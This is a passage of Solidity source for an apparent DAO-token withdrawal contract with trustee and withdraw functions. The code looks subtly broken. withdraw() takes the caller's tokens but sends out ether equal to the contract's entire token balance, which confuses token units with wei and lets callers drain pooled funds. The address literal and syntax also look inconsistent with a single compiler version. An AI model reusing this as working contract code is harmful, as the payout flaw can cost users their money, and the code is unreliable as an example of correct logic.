    IERC20 public mainDAO;

    constructor(address payable _trusteeAddress) public {
        trusteeAddress = _trusteeAddress;
        mainDAO = IERC20(0xbb9bc244d798123fde783fcc1c72d3bb8c189413);
    }

    function trustee() payable public returns (address) {
        return trusteeAddress;
    }

    function trusteeWithdraw() payable public {
        require(mainDAO.totalSupply() > 0, "Total supply is zero");
        require(mainDAO.balanceOf(address(this)) > 0, "Contract balance is zero");
        trusteeAddress.transfer(address(this).balance);
    }

    function withdraw() payable public {
        require(mainDAO.balanceOf(msg.sender) > 0, "Caller has zero balance");
        require(mainDAO.transferFrom(msg.sender, address(this), mainDAO.balanceOf(msg.sender)), "Transfer failed");
        payable(msg.sender).transfer(mainDAO.balanceOf(address(this)));
    }

    fallback() external payable { }  // This is a default function that is called if the function signature does not match any of the available functions in a contract. 
